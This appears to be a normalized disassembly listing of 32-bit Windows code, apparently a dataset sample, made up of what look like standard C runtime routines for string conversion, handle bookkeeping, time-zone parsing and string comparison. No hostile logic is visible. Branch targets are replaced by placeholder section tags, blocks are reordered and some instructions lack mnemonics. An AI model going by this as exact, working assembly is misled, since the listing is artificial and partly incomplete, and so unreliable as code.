push eax
call sub_10037a45
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1002d4db
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10039eea
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10039f6b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10039ff1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_1002d4ee
and [ eax ] 0x0
call sub_1002d4db
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_1002d4ee
mov [ eax ] esi
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_1003a068
push 0xc
push r--data
call sub_1002fdfc
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_1002fe41
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003a0ff
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10034ae2
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_1003a108
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1003a12f
push 0x18
push r--data
call sub_1002fdfc
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_1003013b
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003a2c0
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_1002fe41
retn
push 0x40
push 0x20
call sub_1002ddf5
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_1003a068
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_100301fe
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1003a202
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10034ae2
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_1003a2cc
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1003a2ec
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10027150
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_1003a331
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1003a331
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_1003a2ec
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1003a3e1
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1003a400
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1003a3d8
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1003a3e1
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1003a40c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1003a445
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1003a47e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1003a502
push 0x2c
push r--data
call sub_1002fdfc
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_1003a4c9
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_1003a47e
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_1003a40c
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_1003a445
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
call sub_1002d90b
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_1003d18f
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_10027a85
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_10027160
inc eax
push eax
call sub_1002ddb0
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_1002a840
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1002fe41
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_1003686b
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_10027160
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_1002e87c
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_1003a4f1
push [ ebp - 0x24 ]
call sub_1003a4cf
push [ ebp - 0x28 ]
call sub_1003a4e0
add esp 0xc
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003a7ae
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
jmp r-xdata
push eax
call sub_10027a85
pop ecx
push esi
call sub_1003a9f7
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_1003a9f7
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_1003686b
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_1003a4c3
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_1003a4b7
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_1003a9f7
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_1003a848
push 0x8
push r--data
call sub_1002fdfc
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_1002fe41
retn
push 0x6
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003a88e
call sub_1003a502
inc [ rw-data ]
sub_1003a897
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_1003a8d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_1003a897
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002e156
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002e156
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_1003a9a5
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003a8d0
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_1003a897
pop esi
pop ebp
retn
sub_1003aa0d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002e156
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002e156
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_1003d220
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_1003aaff
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003aa0d
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_1002d4db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_1003d220
sub_1003ab5d
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_1002a8c8
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_1002c1ba
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_1003abf0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_1003ac1d
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1002a8c8
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1003bb73
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1003b0eb
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
sub_1003acc5
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_1002a8c8
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1003bb73
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1003b62f
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
sub_1003ad6d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_1002d4db
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_1002d4db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_10027160
inc eax
push eax
push edi
push esi
call sub_1002e960
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
